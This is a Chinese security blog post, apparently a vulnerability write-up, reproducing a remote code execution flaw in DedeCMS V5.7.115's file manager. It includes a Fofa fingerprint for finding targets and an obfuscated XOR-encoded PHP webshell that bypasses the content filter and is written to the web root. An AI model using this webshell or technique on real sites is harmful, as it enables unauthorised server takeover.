#  【RCE】Dedecms V5.7.115 存在命令执行漏洞   
 WK安全   2025-03-22 20:12  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
    织梦  
内容管理系统(  
DedeCms  
) 以简单、实用、开源而闻名，是国内最知名的  
PHP  
开源网站管理系统，也是使用  
用户  
最多的PHP类  
CMS系统  
，在经历多年的发展，版本无论在功能，还是在易用性方面，都有了长足的发展和进步  
  
Fofa指纹:  
app="DedeCMS"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWHdYQrqlO3fnRAsPzlH234gxEBiacUaKictlljmPkrojfVN0w11pkZOgw/640?wx_fmt=png&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
该漏洞点位于dede/file_manage_control.php  参数str过滤不完善导致的，可以看到当fmdo=edit执行此代码，Filename跟str均可控  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWOJ73bbOnVYoXQNCXmwlveqxTe8wDgIHZyX1dgHibFWcAAsdOSylztgQ/640?wx_fmt=webp&from=appmsg "")  
  
尝试写入一句话木马  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmW0hU4bOhxr0jqib5PApv5iaYrfO8fvTj7EOSOe55wMyCskz65pkBNoEKA/640?wx_fmt=webp&from=appmsg "")  
  
发现被过滤   
  
往上翻发现过滤代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWxOteSEpoofVY7jGsJDa4jmGeC7Q1dL5YvIGwx4ux0j1ln4Ticoj3TZg/640?wx_fmt=webp&from=appmsg "")  
  
掏出精简的小马子绕过  
```
<?  @("Y;HJ(Z"^"8H;/Z.")(${"~?}$"^"!x8p"}[1]);
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWDDfbB57ibhIAXWnCu9GRakVQDsjb15WBVToGcgEn8oheUHibt9NLnXyQ/640?wx_fmt=webp&from=appmsg "")  
  
发现csrf_check  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWUtupwqndfvicib4AaxBeHLCrkicbItIvLRNSxYOra9G0yEhCDcx2kx3Rg/640?wx_fmt=webp&from=appmsg "")  
  
发现对csrf进行检测  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWosgiatc4k0vK6iamk5zSa514rS3EyhbdcRxYW86icGWI6dbzxKianibVDWQ/640?wx_fmt=webp&from=appmsg "")  
  
直接找到前台功能点  /dede/file_manage_main.php?activepath=  
  
随便找一个可以编辑的文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWfIibu63mwoeySSPvl2IKMticLaia5SbXuL5NExua4cYCYyLYRy2kcdPkw/640?wx_fmt=webp&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWh0JZZ0qR6tFP34aTHK7I0UXIt6ml2X1GPaKgGwRxbj9MsQ0MoU5wRA/640?wx_fmt=other&from=appmsg "")  
  
抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmWibSAbtIrP2RWDUh1AHwhuvKJibTAcQoQfbrPGHlrsavD8XMNicGb6HH7w/640?wx_fmt=webp&from=appmsg "")  
  
把shell.php写到根目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmW512wjaia5eKqwJRa6etIF8E3GnLticB08HQ7HnRtM4rU9zGhLujCZNSg/640?wx_fmt=webp&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ccfc3If7RfHJf52bPgrNmW4eUGf9kYA14FqEAWHs4lzAFWyImdxPukXHPiaEN1WkpQEp7Joz0RgpQ/640?wx_fmt=webp&from=appmsg "")  
  
